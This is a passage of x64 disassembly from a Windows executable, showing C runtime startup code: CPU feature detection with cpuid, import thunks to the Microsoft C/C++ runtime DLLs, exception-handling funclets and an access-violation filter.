0000000140006ccb  mov      r8d, dword ptr [rip + 0x553a]                    ; 0x14000c20c
0000000140006cd2  xor      r10d, r10d                                      
0000000140006cd5  mov      qword ptr [rsp + 0x40], rbp                     
0000000140006cda  xor      r14d, r14d                                      
0000000140006cdd  xor      esi, esi                                        
0000000140006cdf  cmp      r11d, 7                                          ; 0x7
0000000140006ce3  jl       0x140006d3d                                      ; 0x140006d3d
0000000140006ce5  xor      ecx, ecx                                        
0000000140006ce7  mov      eax, 7                                           ; 0x7
0000000140006cec  cpuid                                                    
0000000140006cee  mov      ebp, edx                                        
0000000140006cf0  mov      r9d, ebx                                        
0000000140006cf3  bt       ebx, 9                                           ; 0x9
0000000140006cf7  jae      0x140006d04                                      ; 0x140006d04
0000000140006cf9  or       r8d, 2                                           ; 0x2
0000000140006cfd  mov      dword ptr [rip + 0x5508], r8d                    ; 0x14000c20c
0000000140006d04  cmp      eax, 1                                           ; 0x1
0000000140006d07  jl       0x140006d18                                      ; 0x140006d18
0000000140006d09  mov      eax, 7                                           ; 0x7
0000000140006d0e  mov      ecx, 1                                           ; 0x1
0000000140006d13  cpuid                                                    
0000000140006d15  mov      r10d, edx                                       
0000000140006d18  cmp      r11d, 0x24                                       ; 0x24
0000000140006d1c  jl       0x140006d2a                                      ; 0x140006d2a
0000000140006d1e  mov      eax, 0x24                                        ; 0x24
0000000140006d23  xor      ecx, ecx                                        
0000000140006d25  cpuid                                                    
0000000140006d27  mov      r14d, ebx                                       
0000000140006d2a  cmp      r11d, 0x29                                       ; 0x29
0000000140006d2e  jl       0x140006d42                                      ; 0x140006d42
0000000140006d30  mov      eax, 0x29                                        ; 0x29
0000000140006d35  xor      ecx, ecx                                        
0000000140006d37  cpuid                                                    
0000000140006d39  mov      esi, ebx                                        
0000000140006d3b  jmp      0x140006d42                                      ; 0x140006d42
0000000140006d3d  xor      r9d, r9d                                        
0000000140006d40  xor      ebp, ebp                                        
0000000140006d42  mov      rax, qword ptr [rip + 0x535f]                    ; 0x14000c0a8
0000000140006d49  mov      rbx, qword ptr [rsp + 0x38]                     
0000000140006d4e  and      rax, 0xfffffffffffffffe                          ; -0x2
0000000140006d52  mov      dword ptr [rip + 0x5334], 1                      ; 0x14000c090 | 0x1
0000000140006d5c  mov      dword ptr [rip + 0x532e], 2                      ; 0x14000c094 | 0x2
0000000140006d66  mov      qword ptr [rip + 0x533b], rax                    ; 0x14000c0a8
0000000140006d6d  bt       edi, 0x14                                        ; 0x14
0000000140006d71  jae      0x140006d92                                      ; 0x140006d92

; FUNCTION 0x140006d73

0000000140006d73  and      rax, 0xffffffffffffffef                          ; -0x11
0000000140006d77  mov      dword ptr [rip + 0x530f], 2                      ; 0x14000c090 | 0x2
0000000140006d81  mov      qword ptr [rip + 0x5320], rax                    ; 0x14000c0a8
0000000140006d88  mov      dword ptr [rip + 0x5302], 6                      ; 0x14000c094 | 0x6
0000000140006d92  bt       edi, 0x1b                                        ; 0x1b
0000000140006d96  jae      0x140006ec8                                      ; 0x140006ec8
0000000140006d9c  xor      ecx, ecx                                        
0000000140006d9e  xgetbv                                                   
0000000140006da1  shl      rdx, 0x20                                        ; 0x20
0000000140006da5  or       rdx, rax                                        
0000000140006da8  mov      qword ptr [rsp + 0x30], rdx                     
0000000140006dad  bt       edi, 0x1c                                        ; 0x1c
0000000140006db1  jae      0x140006ea4                                      ; 0x140006ea4
0000000140006db7  mov      rax, qword ptr [rsp + 0x30]                     
0000000140006dbc  and      al, 6                                            ; 0x6
0000000140006dbe  cmp      al, 6                                            ; 0x6
0000000140006dc0  jne      0x140006ea4                                      ; 0x140006ea4
0000000140006dc6  mov      eax, dword ptr [rip + 0x52c8]                    ; 0x14000c094
0000000140006dcc  or       eax, 8                                           ; 0x8
0000000140006dcf  mov      dword ptr [rip + 0x52b7], 3                      ; 0x14000c090 | 0x3
0000000140006dd9  mov      dword ptr [rip + 0x52b5], eax                    ; 0x14000c094
0000000140006ddf  test     r9b, 0x20                                        ; 0x20
0000000140006de3  je       0x140006e4a                                      ; 0x140006e4a
0000000140006de5  or       eax, 0x20                                        ; 0x20
0000000140006de8  mov      dword ptr [rip + 0x529e], 5                      ; 0x14000c090 | 0x5
0000000140006df2  mov      dword ptr [rip + 0x529c], eax                    ; 0x14000c094
0000000140006df8  and      r9d, 0xd0030000                                  ; 0xd0030000
0000000140006dff  mov      rax, qword ptr [rip + 0x52a2]                    ; 0x14000c0a8
0000000140006e06  and      rax, 0xfffffffffffffffd                          ; -0x3
0000000140006e0a  mov      qword ptr [rip + 0x5297], rax                    ; 0x14000c0a8
0000000140006e11  cmp      r9d, 0xd0030000                                  ; 0xd0030000
0000000140006e18  jne      0x140006e51                                      ; 0x140006e51
0000000140006e1a  mov      rax, qword ptr [rsp + 0x30]                     
0000000140006e1f  and      al, 0xe0                                         ; 0xe0
0000000140006e21  cmp      al, 0xe0                                         ; 0xe0
0000000140006e23  jne      0x140006e4a                                      ; 0x140006e4a
0000000140006e25  mov      rax, qword ptr [rip + 0x527c]                    ; 0x14000c0a8
0000000140006e2c  or       dword ptr [rip + 0x5261], 0x40                   ; 0x14000c094 | 0x40
0000000140006e33  and      rax, 0xffffffffffffffdb                          ; -0x25
0000000140006e37  mov      dword ptr [rip + 0x524f], 6                      ; 0x14000c090 | 0x6
0000000140006e41  mov      qword ptr [rip + 0x5260], rax                    ; 0x14000c0a8
0000000140006e48  jmp      0x140006e51                                      ; 0x140006e51
0000000140006e4a  mov      rax, qword ptr [rip + 0x5257]                    ; 0x14000c0a8
0000000140006e51  bt       ebp, 0x17                                        ; 0x17
0000000140006e55  jae      0x140006e63                                      ; 0x140006e63
0000000140006e57  btr      rax, 0x18                                        ; 0x18
0000000140006e5c  mov      qword ptr [rip + 0x5245], rax                    ; 0x14000c0a8
0000000140006e63  bt       r10d, 0x13                                       ; 0x13
0000000140006e68  jae      0x140006ea4                                      ; 0x140006ea4
0000000140006e6a  mov      rax, qword ptr [rsp + 0x30]                     
0000000140006e6f  and      al, 0xe0                                         ; 0xe0
0000000140006e71  cmp      al, 0xe0                                         ; 0xe0
0000000140006e73  jne      0x140006ea4                                      ; 0x140006ea4
0000000140006e75  mov      rcx, qword ptr [rip + 0x522c]                    ; 0x14000c0a8
0000000140006e7c  and      rcx, 0xfffffffffeffffd0                          ; -0x1000030
0000000140006e83  movzx    eax, r14b                                       
0000000140006e87  mov      dword ptr [rip + 0x5383], eax                    ; 0x14000c210
0000000140006e8d  mov      qword ptr [rip + 0x5214], rcx                    ; 0x14000c0a8
0000000140006e94  cmp      eax, 1                                           ; 0x1
0000000140006e97  jbe      0x140006ea4                                      ; 0x140006ea4
0000000140006e99  and      rcx, 0xffffffffffffffbf                          ; -0x41
0000000140006e9d  mov      qword ptr [rip + 0x5204], rcx                    ; 0x14000c0a8
0000000140006ea4  bt       r10d, 0x15                                       ; 0x15
0000000140006ea9  jae      0x140006ec8                                      ; 0x140006ec8
0000000140006eab  test     sil, 1                                           ; 0x1
0000000140006eaf  je       0x140006ec8                                      ; 0x140006ec8
0000000140006eb1  mov      rax, qword ptr [rsp + 0x30]                     
0000000140006eb6  bt       rax, 0x13                                        ; 0x13
0000000140006ebb  jae      0x140006ec8                                      ; 0x140006ec8
0000000140006ebd  and      qword ptr [rip + 0x51e0], 0xffffffffffffff7f     ; 0x14000c0a8 | -0x81
0000000140006ec8  mov      rbp, qword ptr [rsp + 0x40]                     
0000000140006ecd  xor      eax, eax                                        
0000000140006ecf  add      rsp, 0x10                                        ; 0x10
0000000140006ed3  pop      r14                                             
0000000140006ed5  pop      rdi                                             
0000000140006ed6  pop      rsi                                             
0000000140006ed7  ret                                                      
0000000140006ed8  int3                                                     
0000000140006ed9  int3                                                     
0000000140006eda  int3                                                     
0000000140006edb  int3                                                     
0000000140006edc  int3                                                     
0000000140006edd  int3                                                     
0000000140006ede  int3                                                     
0000000140006edf  int3                                                     
0000000140006ee0  xor      eax, eax                                        
0000000140006ee2  cmp      dword ptr [rip + 0x51c8], eax                    ; 0x14000c0b0
0000000140006ee8  setne    al                                              
0000000140006eeb  ret                                                      
0000000140006eec  int3                                                     
0000000140006eed  int3                                                     
0000000140006eee  int3                                                     
0000000140006eef  int3                                                     
0000000140006ef0  jmp      qword ptr [rip + 0x14ca]                         ; 0x1400083c0 VCRUNTIME140_1.dll!__CxxFrameHandler4
0000000140006ef6  jmp      qword ptr [rip + 0x149c]                         ; 0x140008398 VCRUNTIME140.dll!__std_terminate
0000000140006efc  jmp      qword ptr [rip + 0x148e]                         ; 0x140008390 VCRUNTIME140.dll!__C_specific_handler
0000000140006f02  jmp      qword ptr [rip + 0x1468]                         ; 0x140008370 VCRUNTIME140.dll!_CxxThrowException
0000000140006f08  jmp      qword ptr [rip + 0x14a2]                         ; 0x1400083b0 VCRUNTIME140.dll!__current_exception
0000000140006f0e  jmp      qword ptr [rip + 0x1454]                         ; 0x140008368 VCRUNTIME140.dll!__current_exception_context
0000000140006f14  jmp      qword ptr [rip + 0x1576]                         ; 0x140008490 api-ms-win-crt-runtime-l1-1-0.dll!exit
0000000140006f1a  jmp      qword ptr [rip + 0x14d8]                         ; 0x1400083f8 api-ms-win-crt-heap-l1-1-0.dll!free
0000000140006f20  jmp      qword ptr [rip + 0x14ca]                         ; 0x1400083f0 api-ms-win-crt-heap-l1-1-0.dll!malloc
0000000140006f26  jmp      qword ptr [rip + 0x14b4]                         ; 0x1400083e0 api-ms-win-crt-heap-l1-1-0.dll!_callnewh
0000000140006f2c  jmp      qword ptr [rip + 0x151e]                         ; 0x140008450 api-ms-win-crt-runtime-l1-1-0.dll!_seh_filter_exe
0000000140006f32  jmp      qword ptr [rip + 0x14f0]                         ; 0x140008428 api-ms-win-crt-runtime-l1-1-0.dll!_set_app_type
0000000140006f38  jmp      qword ptr [rip + 0x14da]                         ; 0x140008418 api-ms-win-crt-math-l1-1-0.dll!__setusermatherr
0000000140006f3e  jmp      qword ptr [rip + 0x14ec]                         ; 0x140008430 api-ms-win-crt-runtime-l1-1-0.dll!_configure_narrow_argv
0000000140006f44  jmp      qword ptr [rip + 0x14ee]                         ; 0x140008438 api-ms-win-crt-runtime-l1-1-0.dll!_initialize_narrow_environment
0000000140006f4a  jmp      qword ptr [rip + 0x14f0]                         ; 0x140008440 api-ms-win-crt-runtime-l1-1-0.dll!_get_initial_narrow_environment
0000000140006f50  jmp      qword ptr [rip + 0x14f2]                         ; 0x140008448 api-ms-win-crt-runtime-l1-1-0.dll!_initterm
0000000140006f56  jmp      qword ptr [rip + 0x1544]                         ; 0x1400084a0 api-ms-win-crt-runtime-l1-1-0.dll!_initterm_e
0000000140006f5c  jmp      qword ptr [rip + 0x14f6]                         ; 0x140008458 api-ms-win-crt-runtime-l1-1-0.dll!_exit
0000000140006f62  jmp      qword ptr [rip + 0x15a0]                         ; 0x140008508 api-ms-win-crt-stdio-l1-1-0.dll!_set_fmode
0000000140006f68  jmp      qword ptr [rip + 0x14fa]                         ; 0x140008468 api-ms-win-crt-runtime-l1-1-0.dll!__p___argc
0000000140006f6e  jmp      qword ptr [rip + 0x14fc]                         ; 0x140008470 api-ms-win-crt-runtime-l1-1-0.dll!__p___argv
0000000140006f74  jmp      qword ptr [rip + 0x14fe]                         ; 0x140008478 api-ms-win-crt-runtime-l1-1-0.dll!_cexit
0000000140006f7a  jmp      qword ptr [rip + 0x1500]                         ; 0x140008480 api-ms-win-crt-runtime-l1-1-0.dll!_c_exit
0000000140006f80  jmp      qword ptr [rip + 0x1502]                         ; 0x140008488 api-ms-win-crt-runtime-l1-1-0.dll!_register_thread_local_exe_atexit_callback
0000000140006f86  jmp      qword ptr [rip + 0x147c]                         ; 0x140008408 api-ms-win-crt-locale-l1-1-0.dll!_configthreadlocale
0000000140006f8c  jmp      qword ptr [rip + 0x1456]                         ; 0x1400083e8 api-ms-win-crt-heap-l1-1-0.dll!_set_new_mode
0000000140006f92  jmp      qword ptr [rip + 0x1568]                         ; 0x140008500 api-ms-win-crt-stdio-l1-1-0.dll!__p__commode
0000000140006f98  jmp      qword ptr [rip + 0x150a]                         ; 0x1400084a8 api-ms-win-crt-runtime-l1-1-0.dll!_initialize_onexit_table
0000000140006f9e  jmp      qword ptr [rip + 0x150c]                         ; 0x1400084b0 api-ms-win-crt-runtime-l1-1-0.dll!_register_onexit_function
0000000140006fa4  jmp      qword ptr [rip + 0x150e]                         ; 0x1400084b8 api-ms-win-crt-runtime-l1-1-0.dll!_crt_atexit
0000000140006faa  jmp      qword ptr [rip + 0x1510]                         ; 0x1400084c0 api-ms-win-crt-runtime-l1-1-0.dll!terminate

; FUNCTION 0x140006fb0

0000000140006fb0  sub      rsp, 0x28                                        ; 0x28
0000000140006fb4  mov      r8, qword ptr [r9 + 0x38]                       
0000000140006fb8  mov      rcx, rdx                                        
0000000140006fbb  mov      rdx, r9                                         
0000000140006fbe  call     0x140006fd0                                      ; 0x140006fd0
0000000140006fc3  mov      eax, 1                                           ; 0x1
0000000140006fc8  add      rsp, 0x28                                        ; 0x28
0000000140006fcc  ret                                                      
0000000140006fcd  int3                                                     
0000000140006fce  int3                                                     
0000000140006fcf  int3                                                     

; FUNCTION 0x140006fd0

0000000140006fd0  mov      qword ptr [rsp + 0x18], rsi                     
0000000140006fd5  push     rdi                                             
0000000140006fd6  sub      rsp, 0x20                                        ; 0x20
0000000140006fda  movsxd   rsi, dword ptr [r8]                             
0000000140006fdd  mov      rdi, rcx                                        
0000000140006fe0  test     sil, 4                                           ; 0x4
0000000140006fe4  je       0x140006ffb                                      ; 0x140006ffb
0000000140006fe6  mov      eax, dword ptr [r8 + 8]                         
0000000140006fea  movsxd   r10, dword ptr [r8 + 4]                         
0000000140006fee  neg      eax                                             
0000000140006ff0  movsxd   r8, eax                                         
0000000140006ff3  add      r10, rcx                                        
0000000140006ff6  and      r10, r8                                         
0000000140006ff9  jmp      0x140006ffe                                      ; 0x140006ffe
0000000140006ffb  mov      r10, rdi                                        
0000000140006ffe  mov      rax, qword ptr [rdx + 0x10]                     
0000000140007002  mov      qword ptr [rsp + 0x30], rbx                     
0000000140007007  mov      qword ptr [rsp + 0x38], rbp                     
000000014000700c  mov      r8d, dword ptr [rax + 8]                        
0000000140007010  add      r8, qword ptr [rdx + 8]                         
0000000140007014  movzx    eax, byte ptr [r8]                              
0000000140007018  movzx    ecx, byte ptr [r8 + 3]                          
000000014000701d  and      al, 7                                            ; 0x7
000000014000701f  cmp      al, 3                                            ; 0x3
0000000140007021  jae      0x140007030                                      ; 0x140007030
0000000140007023  test     cl, 0xf                                          ; 0xf
0000000140007026  je       0x14000703b                                      ; 0x14000703b
0000000140007028  mov      r9d, ecx                                        
000000014000702b  jmp      0x14000712d                                      ; 0x14000712d
0000000140007030  mov      r11d, ecx                                       
0000000140007033  mov      edx, ecx                                        
0000000140007035  and      r11d, 0x1f                                       ; 0x1f
0000000140007039  jne      0x140007043                                      ; 0x140007043
000000014000703b  xor      r9d, r9d                                        
000000014000703e  jmp      0x140007131                                      ; 0x140007131
0000000140007043  add      r8, 4                                            ; 0x4
0000000140007047  mov      eax, r11d                                       
000000014000704a  xor      r9d, r9d                                        
000000014000704d  shr      edx, 5                                           ; 0x5
0000000140007050  add      r8, rax                                         
0000000140007053  mov      ecx, r9d                                        
0000000140007056  test     edx, edx                                        
0000000140007058  je       0x14000707c                                      ; 0x14000707c
000000014000705a  nop      word ptr [rax + rax]                            
0000000140007060  movzx    eax, byte ptr [r8]                              
0000000140007064  add      r8, 3                                            ; 0x3
0000000140007068  shr      eax, 3                                           ; 0x3
000000014000706b  test     eax, eax                                        
000000014000706d  je       0x140007076                                      ; 0x140007076
000000014000706f  add      r8, 3                                            ; 0x3
0000000140007073  add      r8, rax                                         
0000000140007076  inc      ecx                                             
0000000140007078  cmp      ecx, edx                                        
000000014000707a  jb       0x140007060                                      ; 0x140007060
000000014000707c  mov      ebx, r9d                                        
000000014000707f  test     r11d, r11d                                      
0000000140007082  je       0x140007131                                      ; 0x140007131
0000000140007088  lea      rbp, [rip - 0x708f]                              ; 0x140000000
000000014000708f  nop                                                      
0000000140007090  movzx    eax, byte ptr [r8]                              
0000000140007094  movzx    edx, al                                         
0000000140007097  cmp      al, 3                                            ; 0x3
0000000140007099  jbe      0x1400070b4                                      ; 0x1400070b4
000000014000709b  and      dl, 0xf                                          ; 0xf
000000014000709e  lea      ecx, [rdx - 8]                                  
00000001400070a1  cmp      cl, 2                                            ; 0x2
00000001400070a4  jbe      0x1400070b4                                      ; 0x1400070b4
00000001400070a6  movzx    edx, al                                         
00000001400070a9  and      dl, 7                                            ; 0x7
00000001400070ac  lea      ecx, [rdx - 4]                                  
00000001400070af  cmp      cl, 3                                            ; 0x3
00000001400070b2  ja       0x1400070d8                                      ; 0x1400070d8
00000001400070b4  test     dl, dl                                          
00000001400070b6  je       0x140007128                                      ; 0x140007128
00000001400070b8  cmp      al, 3                                            ; 0x3
00000001400070ba  jbe      0x1400070e7                                      ; 0x1400070e7
00000001400070bc  movzx    edx, al                                         
00000001400070bf  and      dl, 0xf                                          ; 0xf
00000001400070c2  lea      ecx, [rdx - 8]                                  
00000001400070c5  cmp      cl, 2                                            ; 0x2
00000001400070c8  jbe      0x1400070e0                                      ; 0x1400070e0
00000001400070ca  movzx    edx, al                                         
00000001400070cd  and      dl, 7                                            ; 0x7
00000001400070d0  lea      ecx, [rdx - 4]                                  
00000001400070d3  cmp      cl, 3                                            ; 0x3
00000001400070d6  jbe      0x1400070e0                                      ; 0x1400070e0
00000001400070d8  and      al, 0x3f                                         ; 0x3f
00000001400070da  cmp      al, 0x20                                         ; 0x20
00000001400070dc  jne      0x140007159                                      ; 0x140007159
00000001400070de  jmp      0x1400070e7                                      ; 0x1400070e7
00000001400070e0  movzx    eax, dl                                         
00000001400070e3  cmp      al, 0x20                                         ; 0x20
00000001400070e5  ja       0x140007159                                      ; 0x140007159
00000001400070e7  movzx    eax, al                                         
00000001400070ea  movzx    eax, byte ptr [rax + rbp + 0x7174]              
00000001400070f2  mov      ecx, dword ptr [rbp + rax*4 + 0x7160]           
00000001400070f9  add      rcx, rbp                                        
00000001400070fc  jmp      rcx                                             
00000001400070fe  mov      eax, 1                                           ; 0x1
0000000140007103  jmp      0x140007118                                      ; 0x140007118
0000000140007105  mov      eax, 2                                           ; 0x2
000000014000710a  jmp      0x140007118                                      ; 0x140007118
000000014000710c  mov      eax, 3                                           ; 0x3
0000000140007111  jmp      0x140007118                                      ; 0x140007118
0000000140007113  mov      eax, 5                                           ; 0x5
0000000140007118  add      r8, rax                                         
000000014000711b  inc      ebx                                             
000000014000711d  cmp      ebx, r11d                                       
0000000140007120  jb       0x140007090                                      ; 0x140007090
0000000140007126  jmp      0x140007131                                      ; 0x140007131
0000000140007128  movzx    r9d, byte ptr [r8 + 1]                          
000000014000712d  and      r9, 0xfffffffffffffff0                           ; -0x10
0000000140007131  lea      rcx, [r9 + rdi]                                 
0000000140007135  mov      rax, rsi                                        
0000000140007138  and      rax, 0xfffffffffffffff8                          ; -0x8
000000014000713c  xor      rcx, qword ptr [rax + r10]                      
0000000140007140  mov      rbp, qword ptr [rsp + 0x38]                     
0000000140007145  mov      rbx, qword ptr [rsp + 0x30]                     
000000014000714a  mov      rsi, qword ptr [rsp + 0x40]                     
000000014000714f  add      rsp, 0x20                                        ; 0x20
0000000140007153  pop      rdi                                             
0000000140007154  jmp      0x1400062f0                                      ; 0x1400062f0
0000000140007159  call     0x1400068d0                                      ; 0x1400068d0
000000014000715e  int3                                                     
000000014000715f  nop                                                      
0000000140007160  add      eax, 0x13000071                                  ; 0x13000071
0000000140007165  jno      0x140007167                                      ; 0x140007167
0000000140007167  add      byte ptr [rcx + rsi*2], cl                      
000000014000716a  add      byte ptr [rax], al                              
000000014000716c  .byte    0xfe                                            
000000014000716d  jo       0x14000716f                                      ; 0x14000716f
000000014000716f  add      byte ptr [rcx + 0x71], bl                       
0000000140007172  add      byte ptr [rax], al                              
0000000140007174  add      byte ptr [rcx], al                              
0000000140007176  add      al, byte ptr [rax]                              
0000000140007178  add      eax, dword ptr [rcx]                            
000000014000717a  add      al, byte ptr [rbx]                              
000000014000717c  add      eax, dword ptr [rcx]                            
000000014000717e  add      al, byte ptr [rsp + rax]                        
0000000140007181  add      al, 4                                            ; 0x4
0000000140007183  add      al, 4                                            ; 0x4
0000000140007185  add      al, 4                                            ; 0x4
0000000140007187  add      al, 4                                            ; 0x4
0000000140007189  add      al, 4                                            ; 0x4
000000014000718b  add      al, 4                                            ; 0x4
000000014000718d  add      al, 4                                            ; 0x4
000000014000718f  add      al, 4                                            ; 0x4
0000000140007191  add      al, 4                                            ; 0x4
0000000140007193  add      al, 0                                            ; 0x0
0000000140007195  int3                                                     
0000000140007196  int3                                                     
0000000140007197  int3                                                     
0000000140007198  int3                                                     
0000000140007199  int3                                                     
000000014000719a  int3                                                     
000000014000719b  int3                                                     
000000014000719c  int3                                                     
000000014000719d  int3                                                     
000000014000719e  int3                                                     
000000014000719f  int3                                                     

; FUNCTION 0x1400071a0

00000001400071a0  push     rbx                                             
00000001400071a2  push     rbp                                             
00000001400071a3  push     rsi                                             
00000001400071a4  push     rdi                                             
00000001400071a5  push     r14                                             
00000001400071a7  sub      rsp, 0x20                                        ; 0x20
00000001400071ab  mov      rbx, qword ptr [r9 + 0x38]                      
00000001400071af  mov      rsi, rdx                                        
00000001400071b2  mov      r14, r8                                         
00000001400071b5  mov      rbp, rcx                                        
00000001400071b8  mov      rdx, r9                                         
00000001400071bb  mov      rcx, rsi                                        
00000001400071be  mov      rdi, r9                                         
00000001400071c1  lea      r8, [rbx + 4]                                   
00000001400071c5  call     0x140006fd0                                      ; 0x140006fd0
00000001400071ca  test     byte ptr [rbp + 4], 0x66                         ; 0x66
00000001400071ce  mov      eax, 0                                           ; 0x0
00000001400071d3  setne    al                                              
00000001400071d6  inc      eax                                             
00000001400071d8  test     dword ptr [rbx + 4], eax                        
00000001400071db  je       0x1400071f8                                      ; 0x1400071f8
00000001400071dd  mov      r9, rdi                                         
00000001400071e0  mov      r8, r14                                         
00000001400071e3  mov      rdx, rsi                                        
00000001400071e6  mov      rcx, rbp                                        
00000001400071e9  add      rsp, 0x20                                        ; 0x20
00000001400071ed  pop      r14                                             
00000001400071ef  pop      rdi                                             
00000001400071f0  pop      rsi                                             
00000001400071f1  pop      rbp                                             
00000001400071f2  pop      rbx                                             
00000001400071f3  jmp      0x140006ef0                                      ; 0x140006ef0
00000001400071f8  mov      eax, 1                                           ; 0x1
00000001400071fd  add      rsp, 0x20                                        ; 0x20
0000000140007201  pop      r14                                             
0000000140007203  pop      rdi                                             
0000000140007204  pop      rsi                                             
0000000140007205  pop      rbp                                             
0000000140007206  pop      rbx                                             
0000000140007207  ret                                                      
0000000140007208  jmp      qword ptr [rip + 0x117a]                         ; 0x140008388 VCRUNTIME140.dll!memcpy
000000014000720e  jmp      qword ptr [rip + 0x116c]                         ; 0x140008380 VCRUNTIME140.dll!memmove
0000000140007214  jmp      qword ptr [rip + 0x115e]                         ; 0x140008378 VCRUNTIME140.dll!memset
000000014000721a  jmp      qword ptr [rip + 0x1300]                         ; 0x140008520 api-ms-win-crt-string-l1-1-0.dll!strcmp
0000000140007220  jmp      qword ptr [rip + 0x130a]                         ; 0x140008530 api-ms-win-crt-string-l1-1-0.dll!strlen
0000000140007226  jmp      qword ptr [rip + 0x1314]                         ; 0x140008540 api-ms-win-crt-string-l1-1-0.dll!wcscmp
000000014000722c  int3                                                     
000000014000722d  int3                                                     
000000014000722e  int3                                                     
000000014000722f  int3                                                     
0000000140007230  int3                                                     
0000000140007231  int3                                                     
0000000140007232  int3                                                     
0000000140007233  int3                                                     
0000000140007234  int3                                                     
0000000140007235  int3                                                     
0000000140007236  nop      word ptr [rax + rax]                            

; FUNCTION 0x140007240

0000000140007240  jmp      rax                                             
0000000140007242  int3                                                     
0000000140007243  int3                                                     
0000000140007244  int3                                                     
0000000140007245  int3                                                     
0000000140007246  int3                                                     
0000000140007247  int3                                                     
0000000140007248  int3                                                     
0000000140007249  int3                                                     
000000014000724a  int3                                                     
000000014000724b  int3                                                     
000000014000724c  int3                                                     
000000014000724d  int3                                                     
000000014000724e  int3                                                     
000000014000724f  int3                                                     
0000000140007250  int3                                                     
0000000140007251  int3                                                     
0000000140007252  int3                                                     
0000000140007253  int3                                                     
0000000140007254  int3                                                     
0000000140007255  int3                                                     
0000000140007256  nop      word ptr [rax + rax]                            

; FUNCTION 0x140007260

0000000140007260  jmp      qword ptr [rip + 0x132a]                         ; 0x140008590
0000000140007266  int3                                                     
0000000140007267  int3                                                     
0000000140007268  int3                                                     
0000000140007269  int3                                                     
000000014000726a  int3                                                     
000000014000726b  int3                                                     
000000014000726c  int3                                                     
000000014000726d  int3                                                     
000000014000726e  int3                                                     
000000014000726f  int3                                                     
0000000140007270  lea      rcx, [rdx + 0x98]                               
0000000140007277  jmp      0x140004b70                                      ; 0x140004b70
000000014000727c  lea      rcx, [rdx + 0x58]                               
0000000140007283  jmp      0x140004b70                                      ; 0x140004b70
0000000140007288  lea      rcx, [rdx + 0xa8]                               
000000014000728f  jmp      0x140004b70                                      ; 0x140004b70
0000000140007294  lea      rcx, [rdx + 0x108]                              
000000014000729b  jmp      0x140004b70                                      ; 0x140004b70
00000001400072a0  lea      rcx, [rdx + 0xc8]                               
00000001400072a7  jmp      0x140004b70                                      ; 0x140004b70
00000001400072ac  lea      rcx, [rdx + 0xe8]                               
00000001400072b3  jmp      0x140004b70                                      ; 0x140004b70
00000001400072b8  lea      rcx, [rdx + 0x68]                               
00000001400072bf  jmp      0x140004b70                                      ; 0x140004b70
00000001400072c4  lea      rcx, [rdx + 0x48]                               
00000001400072cb  jmp      0x140004b70                                      ; 0x140004b70
00000001400072d0  lea      rcx, [rdx + 0xa0]                               
00000001400072d7  jmp      0x140004b70                                      ; 0x140004b70
00000001400072dc  lea      rcx, [rdx + 0x80]                               
00000001400072e3  jmp      0x140004b70                                      ; 0x140004b70
00000001400072e8  lea      rcx, [rdx + 0x60]                               
00000001400072ef  jmp      0x140004b70                                      ; 0x140004b70
00000001400072f4  lea      rcx, [rdx + 0x40]                               
00000001400072fb  jmp      0x140004b70                                      ; 0x140004b70
0000000140007300  lea      rcx, [rdx + 0x98]                               
0000000140007307  jmp      0x140004b70                                      ; 0x140004b70
000000014000730c  lea      rcx, [rdx + 0x28]                               
0000000140007313  jmp      qword ptr [rip + 0xf66]                          ; 0x140008280 MSVCP140.dll!??1_Lockit@std@@QEAA@XZ
000000014000731a  lea      rcx, [rdx + 0x30]                               
0000000140007321  jmp      0x140004fe0                                      ; 0x140004fe0
0000000140007326  lea      rcx, [rdx + 0x50]                               
000000014000732d  jmp      0x140004fbc                                      ; 0x140004fbc
0000000140007332  lea      rcx, [rdx + 0x50]                               
0000000140007339  jmp      0x140004d90                                      ; 0x140004d90
000000014000733e  lea      rcx, [rdx + 0x60]                               
0000000140007345  jmp      0x1400012c8                                      ; 0x1400012c8

; FUNCTION 0x14000734a

000000014000734a  mov      qword ptr [rsp + 0x10], rdx                     
000000014000734f  push     rbp                                             
0000000140007350  sub      rsp, 0x20                                        ; 0x20
0000000140007354  mov      rbp, rdx                                        
0000000140007357  mov      rdx, qword ptr [rbp + 0x48]                     
000000014000735b  mov      rax, qword ptr [rdx]                            
000000014000735e  movsxd   rcx, dword ptr [rax + 4]                        
0000000140007362  add      rcx, rdx                                        
0000000140007365  mov      r8b, 1                                           ; 0x1
0000000140007368  mov      edx, 4                                           ; 0x4
000000014000736d  call     qword ptr [rip + 0xf05]                          ; 0x140008278 MSVCP140.dll!?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QEAAXH_N@Z
0000000140007373  nop                                                      
0000000140007374  movabs   rax, 0                                           ; 0x0
000000014000737e  add      rsp, 0x20                                        ; 0x20
0000000140007382  pop      rbp                                             
0000000140007383  ret                                                      
0000000140007384  int3                                                     
0000000140007385  int3                                                     
0000000140007386  int3                                                     
0000000140007387  int3                                                     
0000000140007388  int3                                                     
0000000140007389  int3                                                     
000000014000738a  int3                                                     
000000014000738b  int3                                                     
000000014000738c  int3                                                     
000000014000738d  int3                                                     
000000014000738e  int3                                                     
000000014000738f  int3                                                     

; FUNCTION 0x140007390

0000000140007390  push     rbp                                             
0000000140007392  sub      rsp, 0x20                                        ; 0x20
0000000140007396  mov      rbp, rdx                                        
0000000140007399  mov      rdx, rcx                                        
000000014000739c  mov      rcx, qword ptr [rcx]                            
000000014000739f  mov      ecx, dword ptr [rcx]                            
00000001400073a1  call     0x140006f2c                                      ; 0x140006f2c
00000001400073a6  nop                                                      
00000001400073a7  add      rsp, 0x20                                        ; 0x20
00000001400073ab  pop      rbp                                             
00000001400073ac  ret                                                      
00000001400073ad  int3                                                     
00000001400073ae  int3                                                     
00000001400073af  int3                                                     

; FUNCTION 0x1400073b0

00000001400073b0  push     rbp                                             
00000001400073b2  mov      rbp, rdx                                        
00000001400073b5  mov      rax, qword ptr [rcx]                            
00000001400073b8  xor      ecx, ecx                                        
00000001400073ba  cmp      dword ptr [rax], 0xc0000005                      ; 0xc0000005
00000001400073c0  sete     cl                                              
00000001400073c3  mov      eax, ecx                                        
00000001400073c5  pop      rbp                                             
00000001400073c6  ret                                                      
00000001400073c7  int3                                                     
00000001400073c8  int3                                                     
00000001400073c9  int3                                                     
00000001400073ca  int3                                                     
00000001400073cb  int3                                                     
00000001400073cc  int3                                                     
00000001400073cd  int3                                                     
00000001400073ce  int3                                                     
00000001400073cf  int3                                                     

; FUNCTION 0x1400073d0

00000001400073d0  push     rbx                                             
00000001400073d2  sub      rsp, 0x20                                        ; 0x20
00000001400073d6  mov      rbx, qword ptr [rip + 0x4db3]                    ; 0x14000c190
